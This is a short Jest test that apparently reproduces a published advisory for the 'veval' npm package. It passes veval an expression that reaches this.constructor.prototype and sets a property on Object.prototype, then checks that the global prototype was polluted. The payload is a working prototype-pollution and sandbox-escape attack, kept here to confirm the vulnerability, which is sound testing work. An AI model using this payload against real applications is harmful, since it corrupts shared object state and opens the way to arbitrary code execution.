//https://github.com/advisories/GHSA-54qm-37qr-w5wq
test("Arbitrary code execution in veval", () => {
  const ve = require("veval");
  expect({}.polluted).toBe(undefined);

  try {
    ve({ hi: 0 }, "1 + (this.constructor.prototype.polluted = `yes`);");
  } catch (error) {}

  expect({}.polluted).toBe("yes");
});
